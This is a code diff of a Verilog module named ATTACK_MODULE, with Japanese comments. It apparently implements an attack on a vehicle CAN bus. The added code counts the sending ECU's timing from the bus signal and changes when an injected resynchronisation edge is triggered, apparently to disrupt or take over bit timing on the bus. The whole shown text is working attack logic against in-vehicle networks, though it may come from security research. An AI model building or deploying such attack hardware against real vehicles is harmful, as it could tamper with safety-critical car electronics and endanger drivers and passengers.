@@ -35,7 +35,7 @@ module ATTACK_MODULE(
     debug
 );
 
-    input clk;
+    input clk;  //16MHz
     input rst;
     input can_signal_in;
     input state;
@@ -128,7 +128,8 @@ module ATTACK_MODULE(
             ex_rsyn <= 0;
         end else if(rsyn_cnt == RSYN_L) begin
             ex_rsyn <= 0;
-        end else if(rsyn_t && UNATTACKED_MSG[MSG_L - 1 - bit_cnt] == 0 && UNATTACKED_MSG[MSG_L - bit_cnt] == 1 && !attack_bit_q) begin
+//        end else if(rsyn_t && UNATTACKED_MSG[MSG_L - 1 - bit_cnt] == 0 && UNATTACKED_MSG[MSG_L - bit_cnt] == 1 && !attack_bit_q) begin
+        end else if(sender_tq==8'd13 && UNATTACKED_MSG[MSG_L - 1 - bit_cnt] == 0 && UNATTACKED_MSG[MSG_L - bit_cnt] == 1 && !attack_bit_q) begin
             ex_rsyn <= 1;
         end
     end
@@ -142,5 +143,47 @@ module ATTACK_MODULE(
             rsyn_cnt <= rsyn_cnt + 1;
         end
     end
+    
+    /*送信側ECUのタイミング計算*/
+    reg [7:0]sender_tq;
+    reg [7:0]sender_cnt;
+    reg [1:0]can_reg;
+    
+    always @(posedge clk) begin
+        if(~rst) begin
+            can_reg <= 0;
+        end else begin
+            can_reg <= {can_reg[0],can_signal_in};
+        end
+    end
+    
+    always @(posedge clk) begin
+        if(~rst) begin
+            sender_cnt <= 0;
+        end else if(~state) begin
+            sender_cnt <= 0;
+        end else if(can_reg == 2'b10 && ~attack_state) begin
+            sender_cnt <= 0;
+        end else if(sender_cnt == 8'd1) begin
+            sender_cnt <= 0;
+        end else begin
+            sender_cnt <= sender_cnt + 1;
+        end
+    end
+    
+    always @(posedge clk) begin
+        if(~rst) begin
+            sender_tq <= 0;
+        end else if(~state) begin
+            sender_tq <= 0;
+        end else if(can_reg == 2'b10 && ~attack_state) begin
+            sender_tq <= 0;
+        end else if(sender_tq==8'd15 && sender_cnt == 8'd1) begin
+            sender_tq <= 0;
+        end else if(sender_cnt == 8'd1) begin
+            sender_tq <= sender_tq + 1;
+        end
+    end
+    
     
 endmodule
